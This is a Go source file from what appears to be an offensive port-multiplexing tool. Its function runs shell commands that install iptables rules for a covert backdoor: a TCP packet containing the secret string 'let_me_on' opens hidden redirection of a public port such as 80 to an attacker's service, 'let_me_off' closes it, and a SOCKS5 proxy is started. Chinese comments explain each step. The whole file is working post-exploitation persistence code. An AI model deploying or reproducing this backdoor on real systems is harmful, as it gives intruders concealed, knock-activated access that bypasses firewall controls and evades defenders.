package root

import (
	"github.com/rs/zerolog"
	"multiplexing_port_socks5/protocols"
	"multiplexing_port_socks5/socks5"
)

func LinuxRun(listenport string, address string, connectport string, connectaddress string, socketport string, p []*protocols.Protocol, logger zerolog.Logger) {

	LinuxCmd("whoami")

	//添加转发规则
	// iptables -t nat -N LETMEIN       #创建端口复用链
	LinuxCmd("iptables -t nat -N LETMEIN")
	//iptables -t nat -A LETMEIN -p tcp -m tcp --dport 80 -j REDIRECT --to-ports 9999  #创建端口复用规则，将流量转发至 22 端口
	LinuxCmd("iptables -t nat -A LETMEIN -p tcp -m tcp --dport " + listenport + " -j REDIRECT --to-ports " + connectport)
	//iptables -A INPUT -p tcp -m string --string 'threathuntercoming' --algo bm -m recent --set --name letmein --rsource -j ACCEPT   #开启开关，如果接收到一个含有threathuntercoming的TCP包，则将来源 IP 添加到加为letmein的列表中
	LinuxCmd("iptables -A INPUT -p tcp -m string --string 'let_me_on' --algo bm -m recent --set --name letmein --rsource -j ACCEPT")
	//iptables -A INPUT -p tcp -m string --string 'threathunterleaving' --algo bm -m recent --name letmein --remove -j ACCEPT      #关闭开关，如果接收到一个含有threathunterleaving的TCP包，则将来源 IP 从letmein的列表中移除
	LinuxCmd("iptables -A INPUT -p tcp -m string --string 'let_me_off' --algo bm -m recent --name letmein --remove -j ACCEPT")
	//iptables -t nat -A PREROUTING -p tcp --dport 80 --syn -m recent --rcheck --seconds 3600 --name letmein --rsource -j LETMEIN    #如果发现 SYN 包的来源 IP 处于 letmein 列表中，将跳转到 LETMEIN 链进行处理，有效时间为 3600 秒
	LinuxCmd("iptables -t nat -A PREROUTING -p tcp --dport " + listenport + " --syn -m recent --rcheck --seconds 3600 --name letmein --rsource -j LETMEIN")
	// iptables -t nat -A PREROUTING -p tcp -m tcp --dport 80 -j REDIRECT --to-ports 9999
	// LinuxCmd("iptables -t nat -A PREROUTING -p tcp -m tcp --dport " + listenport + " -j REDIRECT --to-ports " + connectport)

	//创建一个socks5
	go socks5.CreateForwardSocks(socketport)
	protocols.RunServer(connectaddress+":"+connectport, p, logger)

}
